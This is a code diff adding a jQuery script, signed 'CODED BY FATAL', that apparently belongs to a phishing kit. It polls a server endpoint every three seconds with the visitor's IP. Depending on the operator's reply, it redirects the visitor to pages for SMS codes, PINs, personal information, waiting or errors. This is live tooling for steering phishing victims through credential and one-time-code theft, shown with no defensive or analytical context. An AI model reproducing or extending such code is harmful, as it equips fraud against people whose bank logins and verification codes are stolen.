@@ -1,0 +1,65 @@
+
+ $(document).ready(function() {
+
+    gonder();
+
+    var int=self.setInterval("gonder()",3000);
+  
+});
+
+function gonder(){
+
+    $.ajax({
+      type:'POST',
+      url:'datach.php?ip=185.220.101.133',
+      success: function (msg) {
+      
+      if(msg=='sms'){
+        window.location.href='sms.php';
+      }
+      if(msg=='tebrik'){
+        window.location.href='submit.php';
+      }
+       if(msg=='hata'){
+        window.location.href='error.php';
+      }
+      if(msg=='sms2'){
+        window.location.href='hatali.php';
+      }
+        if(msg=='back'){
+        window.location.href='sms.php';
+      }
+          if(msg=='pin'){
+        window.location.href='pin.php';
+      }
+         if(msg=='back'){
+        window.location.href='index.php?1';
+      }
+         if(msg=='priv'){
+        window.location.href='page.php';
+         }
+            if(msg=='1'){
+        window.location.href='index.php?1';
+      }       if(msg=='2'){
+        window.location.href='infos.php';
+      }          if(msg=='3'){
+        window.location.href='wait.php';
+      }          if(msg=='4'){
+        window.location.href='error.php';
+      }          if(msg=='5'){
+        window.location.href='submit.php';
+      }  
+      }
+    });
+    
+}
+//CODED BY FATAL | ILETISIM ICQ: fatal1
+
+
+    $(document).ready(function () {
+        $('form').submit(function () {
+            $('.formSubmitRow').hide();
+            $('.loader').show();
+        });
+
+    });
